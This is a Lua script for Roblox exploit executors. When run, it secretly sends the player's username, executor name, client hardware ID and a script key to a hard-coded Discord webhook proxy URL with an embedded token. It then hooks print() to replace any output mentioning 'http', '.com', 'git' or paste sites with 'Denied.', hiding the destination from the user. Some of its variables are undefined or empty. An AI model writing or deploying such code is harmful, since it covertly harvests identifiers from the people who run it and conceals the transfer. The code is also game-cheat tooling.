_G = ""
local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local GetKey = _G

local url =
"https://webhook.lewisakura.moe/api/webhooks/1117348830258663524/KfCoiHs9zmf4a_1_pD4hE1WyroBEk7s67zJ4scCu8Ub4QmpGob58r1JB4HiDaKDFpYHR" --we just keep track  on how many users we use lmfao.
local data = {
["content"] = "**Detected user that executed the script:**",
["embeds"] = {
{
["title"] =  "All information of the user:",
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(12000000),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Game Name:",
                                ["value"] = GetLocalGame,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = false,
                            },
                            {
                                ["name"] = "Script Key:",
                                ["value"] = GetKey,
                                ["inline"] = false,
                            }
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
